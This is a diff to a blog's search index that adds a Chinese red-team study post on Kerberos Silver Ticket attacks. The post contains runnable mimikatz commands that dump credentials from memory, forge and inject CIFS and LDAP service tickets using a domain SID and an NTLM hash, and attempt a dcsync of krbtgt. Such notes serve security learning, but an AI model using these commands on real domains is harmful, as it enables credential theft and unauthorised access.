@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>【内网学习笔记】29、白银票据</title>
+      <link href="//211009-145524.html"/>
+      <url>//211009-145524.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p><blockquote><p>Kerberos 协议详解：<a href="https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p></blockquote><p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据  ST 直接与服务器 Server 进行交互。</p><p>白银票据与黄金票据的区别：</p><p>1、白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</p><p>2、白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p><p>想利用白银票据需要先知道以下信息：</p><ul><li>域名</li><li>域 SID</li><li>目标服务器的 FQDN 即完整的域名</li><li>可利用的服务</li><li>服务账户的 NTLM 哈希</li><li>伪造的用户名即任意用户名</li></ul><h2 id="1、伪造-CIFS-服务权限"><a href="#1、伪造-CIFS-服务权限" class="headerlink" title="1、伪造 CIFS 服务权限"></a>1、伪造 CIFS 服务权限</h2><p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p><pre class="line-numbers language-none"><code class="language-none">klist purge# 或者在 mimikatz 里清除kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 mimikatz 生成伪造的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p><h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p><p>接下来生成 LDAP 服务的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091403286.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a></p><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p><p>原文链接：</p><p><a href="https://teamssix.com/211009-145524.html">https://teamssix.com/211009-145524.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 红队 </tag>
+            
+            <tag> 学习笔记 </tag>
+            
+            <tag> 内网 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【内网学习笔记】28、黄金票据</title>
       <link href="//210927-163036.html"/>
       <url>//210927-163036.html</url>
